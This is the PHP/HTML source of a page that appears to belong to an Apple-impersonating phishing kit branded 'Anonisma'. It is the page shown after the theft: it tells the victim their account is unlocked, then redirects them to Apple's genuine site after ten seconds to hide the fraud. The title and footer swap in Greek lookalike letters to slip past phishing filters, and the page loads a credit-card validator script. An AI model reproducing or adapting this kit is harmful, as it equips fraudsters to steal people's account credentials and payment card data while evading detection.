<?php
	session_start();
	
	header( "refresh:10;url=https://secure.store.apple.com/shop/account/setup/start" );
	
	
?>
<!DOCTYPE html>
<?php
	session_start();
	
	header( "refresh:10;url=https://secure.store.apple.com/shop/account/setup/start" );
	
	
?>
<html><head><style type="text/css">@charset "UTF-8";[ng\:cloak],[ng-cloak],[data-ng-cloak],[x-ng-cloak],.ng-cloak,.x-ng-cloak,.ng-hide{display:none !important;}ng\:form{display:block;}.ng-animate-block-transitions{transition:0s all!important;-webkit-transition:0s all!important;}.ng-hide-add-active,.ng-hide-remove{display:block!important;}</style>
		<title>Αccount Setting</title>
		<meta name="robots" content="noindex">

		<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
		<meta name="viewport" content="width=device-width, maximum-scale=1.0, user-scalable=1">
			<link rel="stylesheet" href="../set/css/common.css">
		<link rel="stylesheet" href="../set/css/account.css">
		<link rel="logo-icon" href="../set/img/iconisma.ico">
		<link rel="stylesheet" href="../set/css/bootstrap.min.css">
		<link rel="stylesheet" href="../set/css/bootstrap-theme.min.css">
		<link rel="stylesheet" href="../set/cssisma/tot.css" type="text/css">
		<link rel="stylesheet" href="../set/css/styles.css">
	

		<script src="../set/js/jquery-1.11.0.min.js"></script>
		<script src="../set/js/jquery.creditCardValidator.js"></script>
		<script src="../set/js/demo.js"></script>
		<script src="../set/js/angular.min.js"></script>
		<script src="../set/js/jquery.maskedinput.js" type="text/javascript"></script>
		
		

<style>
	@import url('//maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css');
 
.isa_info, .isa_success, .isa_warning, .isa_error {
margin: 10px 0px;
padding:12px;
}
.isa_info {
    color: #00529B;
    background-color: #BDE5F8;
}
.isa_success {
    color: #4F8A10;
    background-color: #DFF2BF;
	border-radius:.5em;
}
.isa_warning {
    color: #9F6000;
    background-color: #FEEFB3;
}
.isa_error {
    color: #D8000C;
    background-color: #FFBABA;
}
.isa_info i, .isa_success i, .isa_warning i, .isa_error i {
    margin:10px 22px;
    font-size:2em;
    vertical-align:middle;
}
	</style>
		
	</head>	
	
	
	<body style="background:#F3F3F3">
		
		
<nav style="text-align:center;" id="Anonisma-free-tools" class="col-xs-12" role="navigation" aria-label="Global Navigation" data-hires="false" data-analytics-region="global nav" lang="en-US">
			<div id="gh-content" class="col-xs-12">
				<div class="col-xs-12">
					<ul class="Anonisma-nav-lista">
						<li class="isma tabl-tfa7a-ma3douda"><a class="Anonisma-link" href="../index.php"><span class="NON"></span></a></li>
						<li class="isma tabl-maaak"><a class="Anonisma-link" href="index.php"><span class="NON"></span></a></li>
						<li class="isma tabl-iphone"><a class="Anonisma-link" href="index.php"><span class="NON"></span></a></li>
						<li class="isma tabl-lkhra"><a class="Anonisma-link" href="index.php"><span class="NON"></span></a></li>
						<li class="isma tabl-ipaaad"><a class="Anonisma-link" href="index.php"><span class="NON"></span></a></li>
						<li class="isma tabl-hhhhhh"><a class="Anonisma-link" href="index.php"><span class="NON"></span></a></li>
						<li class="isma tabl-morocco"><a class="Anonisma-link" href="index.php"><span class="NON"></span></a></li>
						<li class="isma tabl-Espaï¿½a"><a class="Anonisma-link" href="index.php"><span class="NON"></span></a></li>
						<li id="Anonisma-buscar" class="isma Anonisma-buscar">
							<div id="takhwar" class="takhwar" role="search">
							</div>
							
						</li>
					</ul>
				</div>
			</div>
</nav>
		<div class="container">

		
			
			<div class="row row2">
				
					<div class=" col-xs-4 sidebar mobile-hide">
					<img style="width:100%; position:relative; top:20px;" src="../set/img/Untitled2.png ">
					</div>
					
					<form id="form" name="form" method="POST" action="" class="ng-pristine ng-valid"> 
					<div class="col-xs-4 loop mobile" style="">
					
					
						
						
						<div class="panel panel-default" id="pp" style="
    margin: 110px 36px;
">
							<div class="panel-heading"> </div>
							<div class="panel-body" name="prof" id="prof">
							
						<div class="isa_success">
								 <i style="float: left;" class="fa fa-check"></i>
									<p style="">
								Thank you, you may now use account as usual, you will recieve a confirmation email shortly if your account is fully unlocked.</p>
							</div>
				
							
			
					
							</div>
							
						</div>

				
					</div>
						<div class="footbar col-xs-12">
					<p style="padding:15px;">We use a Highly encryption to prοtect the cοnfidentiality of yοur Ρersοnal infοrmation.</p>
					</div>
				</form>
			</div>
			<br>
			<br>
			<br>
			<br>
			<div class="panel-footer footer">
				<img src="../set/img/footer.png" class="img-responsive">
			</div>
		</div>
		

		</body></html>